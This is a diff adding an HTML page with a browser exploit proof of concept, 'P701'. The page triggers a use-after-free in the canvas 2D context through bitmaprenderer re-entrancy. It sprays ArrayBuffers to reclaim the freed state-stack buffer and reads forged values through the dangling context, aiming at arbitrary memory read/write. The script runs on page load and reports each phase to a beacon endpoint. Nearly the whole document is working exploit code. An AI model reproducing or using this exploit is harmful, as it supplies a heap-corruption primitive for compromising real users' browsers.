@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P701 — freed-state-buffer reclaim (pivot off the 768B IsoHeap slot)</title>
+<script>
+'use strict';
+/* ============================================================
+ * P701 — PIVOT: reclaim the out-of-line m_stateStack BUFFER
+ *
+ * P700 established:
+ *   V0 (no spray)                 -> DIES  (null m_buffer after free)
+ *   V1 (200 same-type contexts)   -> LIVES, lw=1337
+ * plus P697/P698/P699: AB(768)-only spray DIES before any forge.
+ *
+ * Conclusion: ArrayBuffer(768) does NOT reclaim the freed
+ * CanvasRenderingContext2D slot on this build (the 768B class is
+ * IsoHeap-segregated). Replacing the object is the wrong branch.
+ *
+ * New branch — the STATE BUFFER is on the GENERAL heap:
+ *   ctx.save() x N grows Vector<State> out-of-line to N*400 bytes
+ *   (~6656B bmalloc class for 16 saves). That buffer is ordinary
+ *   heap, NOT the 768B IsoHeap class, so an ArrayBuffer CAN take it.
+ *
+ * Plan:
+ *   1. Create ctx, save() x16 -> m_stateStack.m_buffer = heap buf
+ *   2. Record a distinctive lineWidth, then UAF-free the ctx via the
+ *      bitmaprenderer/2d re-entrancy (this frees ctx AND its buffer)
+ *   3. Spray ArrayBuffer(STATE_BYTES) to reclaim the freed buffer
+ *   4. Fill the AB with a forged State array whose entry[0]
+ *      (globalAlpha @+0, lineWidth @+48, miterLimit @+64) carry
+ *      sentinel doubles
+ *   5. Read through the DANGLING ctx (its m_stateStack Vector struct
+ *      still points at the freed buffer): lineWidth should return our
+ *      sentinel -> proves we own the live State array
+ *
+ * Sentinels are chosen to be DAZ-safe and unmistakable:
+ *   lineWidth  -> 4242.5   (0x40B0924000000000)
+ *   miterLimit -> 7777.25  (0x40BE62...)
+ *   globalAlpha-> 0.375    (0x3FD8000000000000)
+ *
+ * If lineWidth comes back 4242.5 we own the State array => then
+ * getLineDash/setLineDash forge (State+168 Vector) gives arbitrary
+ * R/W without ever touching the 768B slot.
+ * ============================================================ */
+
+function raw(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P701-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,300))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function hex(v){return '0x'+BigInt(v).toString(16)}
+function f64bits(v){var bb=new ArrayBuffer(8);new Float64Array(bb)[0]=v;
+  return new BigUint64Array(bb)[0]}
+function desc(bits){
+  if(bits===BigInt('0x40B0924000000000')) return 'SENTINEL-lw';
+  if(bits===BigInt('0x4094e40000000000')) return 'IS-1337';
+  if(bits===BigInt(0)) return 'ZERO';
+  if(bits>=BigInt('0x1000000000')&&bits<BigInt('0x8000000000')) return 'HEAP-PTR';
+  return 'OTHER';
+}
+
+/* State is 400 bytes; 16 saves -> ~17 States. Use the 6656B class. */
+var NSAVES=16;
+var STATE_BYTES=6656;
+var LW_SENT=4242.5;
+var ML_SENT=7777.25;
+
+function run(){
+  raw('BOOT','nsaves='+NSAVES+'|buf='+STATE_BYTES);
+  try{ go(); }catch(e){ raw('ERR',(e.message||'').slice(0,140)); }
+}
+
+function go(){
+  /* ---- Phase 0: build a context with an OUT-OF-LINE state stack ---- */
+  var cv0=document.createElement('canvas'); cv0.width=8; cv0.height=8;
+  var c0=cv0.getContext('2d');
+  if(!c0){ raw('P0-NOCTX',''); return; }
+  for(var s=0;s<NSAVES;s++) c0.save();
+  c0.lineWidth=LW_SENT;      /* value we will try to read back later */
+  c0.miterLimit=ML_SENT;
+  /* confirm the Vector really went out-of-line by reading it back */
+  raw('P0-BUILT','saves='+NSAVES+'|lw='+c0.lineWidth+'|ml='+c0.miterLimit);
+
+  /* ---- Phase 1: UAF — free a 2d context AND (with it) a state buffer ----
+   * Build the victim so that its own state stack is out-of-line, then
+   * trigger the re-entrancy: the inner 2d context is replaced by the
+   * bitmaprenderer context and destroyed, freeing its Vector buffer. */
+  var inner=null;
+  var cv=document.createElement('canvas'); cv.width=8; cv.height=8;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){
+    inner=cv.getContext('2d');
+    for(var k=0;k<NSAVES;k++) inner.save();   /* out-of-line stack */
+    inner.lineWidth=111.5;
+    inner.miterLimit=222.25;
+    return true;
+  }});
+  cv.getContext('bitmaprenderer', o);
+  raw('P1-UAF','inner='+(inner?'OK':'NULL'));
+  if(!inner){ raw('P1-FAIL','no-inner'); return; }
+
+  /* ---- Phase 2: spray AB(STATE_BYTES) to take the freed buffer ----
+   * Fill the whole AB with a forged State array: State 0 carries our
+   * sentinels at the documented offsets. Repeat for every State slot
+   * so it works whichever index the stale m_size selects. */
+  var SPRAY=120;
+  var abs=[];
+  for(var i=0;i<SPRAY;i++) abs.push(new ArrayBuffer(STATE_BYTES));
+  raw('P2-SPRAY','n='+SPRAY+'|sz='+STATE_BYTES);
+
+  for(var a=0;a<abs.length;a++){
+    var f64=new Float64Array(abs[a]);
+    var n=f64.length;                       /* STATE_BYTES/8 */
+    for(var q=0;q<n;q++) f64[q]=0;
+    /* every 50-double stride == one 400-byte State */
+    for(var base=0; base+80<=n; base+=50){
+      f64[base+0]=0.375;      /* globalAlpha  @ State+0   */
+      f64[base+6]=LW_SENT;    /* lineWidth    @ State+48  */
+      f64[base+8]=ML_SENT;    /* miterLimit   @ State+64  */
+    }
+  }
+  raw('P2-FILLED','states-per-ab='+Math.floor((STATE_BYTES/8)/50));
+
+  /* ---- Phase 3: read through the dangling context ---- */
+  var lw=null,err=null;
+  try{ lw=inner.lineWidth; }catch(e){ err=(e.message||String(e)); }
+
+  if(err!==null){ raw('P3-READ-ERR',err.slice(0,140)); return; }
+
+  var bits=f64bits(lw);
+  raw('P3-READ','lw='+lw+'|bits='+hex(bits)+'|'+desc(bits));
+
+  try{
+    var ml=inner.miterLimit, mb=f64bits(ml);
+    raw('P3-ML','ml='+ml+'|bits='+hex(mb)+'|'+desc(mb));
+  }catch(e){ raw('P3-ML-ERR',(e.message||'').slice(0,90)); }
+
+  try{
+    var ga=inner.globalAlpha, gb=f64bits(ga);
+    raw('P3-GA','ga='+ga+'|bits='+hex(gb)+'|'+desc(gb));
+  }catch(e){ raw('P3-GA-ERR',(e.message||'').slice(0,90)); }
+
+  var won = (bits===BigInt('0x40B0924000000000'));
+  raw('DONE','stateBufferOwned='+won+'|lw_bits='+hex(bits));
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P701 — freed state-buffer reclaim</pre></body></html>
